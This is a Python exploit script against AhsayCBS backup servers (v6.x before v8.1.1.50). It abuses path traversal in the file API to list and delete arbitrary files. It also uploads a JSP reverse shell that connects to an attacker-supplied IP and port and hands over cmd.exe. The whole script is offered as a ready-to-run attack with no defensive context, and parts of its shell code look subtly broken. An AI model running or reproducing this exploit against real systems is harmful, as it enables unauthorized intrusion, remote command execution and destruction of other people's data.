#!/usr/bin/env python3

import urllib3
import argparse
import base64
import re
import gzip
import json
import hashlib
from urllib.parse import urlencode

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def b64(s):
    """Base64 encode a string."""
    return base64.b64encode(s.encode('utf-8')).decode('utf-8')


def md5_sum(buf):
    """Calculate MD5 hash of the given buffer."""
    hasher = hashlib.md5()
    hasher.update(buf)
    return hasher.hexdigest()


class Exploit:
    def __init__(self, url, username="", password="", proxy=""):
        self.url = url.rstrip('/')
        self.username = username
        self.password = password
        self.account_valid = None
        self.http = urllib3.ProxyManager(proxy) if proxy else urllib3.PoolManager()

    def check_account(self):
        """Check if the provided account credentials are valid."""
        try:
            headers = {
                'X-RSW-custom-encode-password': b64(self.password),
                'X-RSW-custom-encode-username': b64(self.username),
            }
            r = self.http.request('POST', f'{self.url}/obs/obm7/user/getUserProfile', headers=headers)
            if r.status == 200:
                if self.account_valid is None:
                    print(f"Account is valid with username: '{self.username}' and password '{self.password}'")
                self.account_valid = True
                return True
            else:
                print(f"Account check failed: {r.data.decode('utf-8')}")
                self.account_valid = False
                return False
        except Exception as e:
            print(f"Error checking account: {e}")
            return False

    def file_actions(self, path="../../../../../../", action='list', recurse=False):
        """Perform file actions like list, download, delete."""
        if not self.check_account():
            return False
        try:
            recurse_flag = "true" if recurse else "false"
            headers = {
                'X-RSW-Request-0': b64(self.username),
                'X-RSW-Request-1': b64(self.password),
            }
            params = {
                'X-RSW-custom-encode-path': path,
                'recursive': recurse_flag,
            }
            url = f'{self.url}/obs/obm7/file/{action}?{urlencode(params)}'
            r = self.http.request('GET' if action == "list" else 'DELETE', url, headers=headers)

            if r.status == 200:
                if action == 'list':
                    self._print_file_list(r)
                elif action == 'delete':
                    print("File deleted successfully.")
                else:
                    return r.data.decode('utf-8')
            else:
                print(f"File action failed: {r.status} - {r.data.decode('utf-8')}")
        except Exception as e:
            print(f"Error during file action '{action}': {e}")

    def _print_file_list(self, response):
        """Print the file list."""
        try:
            result = json.loads(gzip.decompress(response.data))
            print(f"{'-' * 50}\n{'Type':<11}{'Size':<16}{'Name':<20}\n{'-' * 50}")
            for item in result["children"]:
                print(f"{item['fsoType']:<11}{item['size']:<16}{item['name']:<20}")
            print(f"{'-' * 50}")
        except Exception as e:
            print(f"Error parsing file list: {e}")

    def upload(self, file_path, file_content):
        """Upload a file."""
        if not self.check_account():
            return False
        try:
            headers = {
                'X-RSW-Request-0': b64(self.username),
                'X-RSW-Request-1': b64(self.password),
                'X-RSW-custom-encode-path': b64(file_path),
            }
            r = self.http.request('PUT', f'{self.url}/obs/obm7/file/upload', body=file_content, headers=headers)
            if r.status == 201:
                print(f"File uploaded successfully: {r.reason}")
            else:
                print(f"Upload failed: {r.status} - {r.data.decode('utf-8')}")
        except Exception as e:
            print(f"Error uploading file: {e}")

    def exploit(self, ip, port, upload_path="../../webapps/cbs/help/en/", shell_file="test.jsp"):
        """Run the reverse shell exploit."""
        if not self.check_account():
            return False

        reverse_shell = f"""<%@page import="java.net.*,java.io.*"%>
        <%
        try {{
            Socket s = new Socket("{ip}", {port});
            Process p = Runtime.getRuntime().exec("cmd.exe");
            new BufferedReader(new InputStreamReader(p.getInputStream()))
                .transferTo(new PrintWriter(s.getOutputStream()));
        }} catch (Exception e) {{}}
        %>
        """
        try:
            exploit_path = f"{upload_path}{shell_file}"
            self.upload(exploit_path, reverse_shell)
            print(f"Reverse shell uploaded to {exploit_path}. Triggering shell...")
            self.http.request('GET', f'{self.url}/{exploit_path}')
            print("Check your listener for the reverse shell.")
        except Exception as e:
            print(f"Exploit failed: {e}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Exploit for AhsayCBS v6.x < v8.1.1.50")
    parser.add_argument("--host", required=True, help="URL of AhsayCBS server")
    parser.add_argument("--username", help="Username")
    parser.add_argument("--password", help="Password")
    parser.add_argument("--action", choices=["list", "upload", "delete"], help="File action")
    parser.add_argument("--path", default="../../../../../../", help="Target file/directory path")
    parser.add_argument("--ip", help="Attacker IP for reverse shell")
    parser.add_argument("--port", type=int, help="Attacker port for reverse shell")
    args = parser.parse_args()

    exploit = Exploit(args.host, args.username, args.password)
    if args.action == "list":
        exploit.file_actions(args.path, action="list")
    elif args.action == "delete":
        exploit.file_actions(args.path, action="delete")
    elif args.ip and args.port:
        exploit.exploit(args.ip, args.port)
